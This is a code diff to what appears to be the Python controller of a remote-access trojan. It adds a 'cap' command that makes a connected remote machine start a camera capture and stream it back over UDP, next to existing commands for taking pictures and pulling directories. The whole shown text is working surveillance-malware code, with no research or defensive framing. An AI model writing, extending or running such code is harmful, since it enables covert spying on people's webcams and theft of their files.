@@ -9,7 +9,7 @@ from time import sleep
 from colorama import init
 from colorama.ansi import Fore
 from cryptography.fernet import Fernet
-from collections import deque
+from udp import UDP
 
 init(autoreset=True)
 
@@ -32,7 +32,6 @@ class TCP:
         sleep(0.05)
         self.initDir = os.getcwd()
         self.pics = 0
-        self.comandos = deque()
         info = self.__conexion.recv(1024).decode()
         info = info.split('\n')
         self.__userName = info[0]
@@ -408,6 +407,22 @@ class TCP:
         else:
             print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
 
+    def captura(self, cmd):
+        udp = UDP(self.__host, self.__port)
+        self.__conexion.send(cmd.encode())
+
+        msg = self.__conexion.recv(1024).decode()
+        if msg[:6].lower() != "error:":
+            try:
+                udp.conectar()
+                udp.captura(self.__userName)
+                sleep(0.5)
+                udp.close()
+            except:
+                udp.close()
+        else:
+            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
+
     def sendDirFrom(self, cmd):
         if re.search("-d[= ]", cmd):
             if re.search("-i[= ]", cmd):
@@ -664,7 +679,18 @@ class TCP:
                             print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")
                     
                     except:
-                        print(Fore.RED + "Error de proceso (pic)")
+                        print(Fore.RED + "[-] Error de proceso (pic)")
+
+                elif cmd.lower()[:3] == "cap":
+                    try:
+                        if re.search("-c[= ]", cmd):
+                            self.captura(cmd)
+
+                        else:
+                            print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")
+
+                    except:
+                        print(Fore.RED + "[-] Error de proceso (cap)")
 
                 elif cmd.lower()[:3] == "sdf":
                     try:
